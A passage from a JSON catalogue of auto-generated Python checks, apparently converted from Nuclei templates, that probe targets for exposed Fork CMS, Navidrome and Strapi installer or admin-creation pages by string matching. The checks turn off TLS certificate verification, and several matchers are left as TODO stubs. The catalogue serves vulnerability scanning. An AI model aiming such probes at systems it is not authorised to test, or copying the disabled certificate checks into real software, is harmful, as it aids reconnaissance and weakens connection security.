ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) 'Install Fork CMS, Settings' | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['Install Fork CMS, Settings']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Fork CMS - Installer\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_fork_installer(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: fork-installer\nName: Fork CMS - Installer\nSeverity: critical\nDescription: Fork CMS installer page was detected.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_fork_installer:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"fork-installer\"\n    SEVERITY = \"critical\"\n    NAME = \"Fork CMS - Installer\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) 'Install Fork CMS, Settings' | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['Install Fork CMS, Settings']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Fork CMS - Installer\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_fork_installer(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "misconfig",
          "exposure",
          "fork",
          "cms",
          "install",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_navidrome_admin_install",
        "name": "Navidrome Admin User Creation",
        "language": "Python",
        "famille": "Misconfiguration",
        "description": "",
        "severity": "critical",
        "detection": "[AND] mot(s) '\"isAdmin\":true' | status HTTP [200]",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          },
          {
            "name": "root_url",
            "datatype": "string",
            "required": false,
            "description": "URL racine sans chemin"
          },
          {
            "name": "username",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: username",
            "default": "admin"
          },
          {
            "name": "password",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: password",
            "default": "{{to_lower(rand_text_alpha(8))}}"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: navidrome-admin-install\nName: Navidrome Admin User Creation\nSeverity: critical\nDescription: \nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_navidrome_admin_install:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"navidrome-admin-install\"\n    SEVERITY = \"critical\"\n    NAME = \"Navidrome Admin User Creation\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[AND] mot(s) \\'\"isAdmin\":true\\' | status HTTP [200]'\n\n        # Simple word matcher simulation\n        matchers = ['\"isAdmin\":true']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Navidrome Admin User Creation\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_navidrome_admin_install(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: navidrome-admin-install\nName: Navidrome Admin User Creation\nSeverity: critical\nDescription: \nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_navidrome_admin_install:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"navidrome-admin-install\"\n    SEVERITY = \"critical\"\n    NAME = \"Navidrome Admin User Creation\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[AND] mot(s) \\'\"isAdmin\":true\\' | status HTTP [200]'\n\n        # Simple word matcher simulation\n        matchers = ['\"isAdmin\":true']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Navidrome Admin User Creation\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_navidrome_admin_install(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "navidrome",
          "installer",
          "misconfig",
          "intrusive",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_strapi_admin_installer",
        "name": "Strapi Admin - Installer",
        "language": "Python",
        "famille": "Misconfiguration",
        "description": "Strapi Admin Registration enabled was detected.",
        "severity": "critical",
        "detection": "[AND] mot(s) 'Welcome to your Strapi app, Click to create the first administration' | status HTTP [200]",
        "parameters": [
          {
            "name": "base_url",
            "datatype": "string",
            "required": true,
            "description": "URL de base de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: strapi-admin-installer\nName: Strapi Admin - Installer\nSeverity: critical\nDescription: Strapi Admin Registration enabled was detected.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_strapi_admin_installer:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"strapi-admin-installer\"\n    SEVERITY = \"critical\"\n    NAME = \"Strapi Admin - Installer\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) 'Welcome to your Strapi app, Click to create the first administration' | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['Welcome to your Strapi app, Click to create the first administration']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Strapi Admin - Installer\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_strapi_admin_installer(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: strapi-admin-installer\nName: Strapi Admin - Installer\nSeverity: critical\nDescription: Strapi Admin Registration enabled was detected.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_strapi_admin_installer:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"strapi-admin-installer\"\n    SEVERITY = \"critical\"\n    NAME = \"Strapi Admin - Installer\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) 'Welcome to your Strapi app, Click to create the first administration' | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['Welcome to your Strapi app, Click to create the first administration']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Strapi Admin - Installer\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = 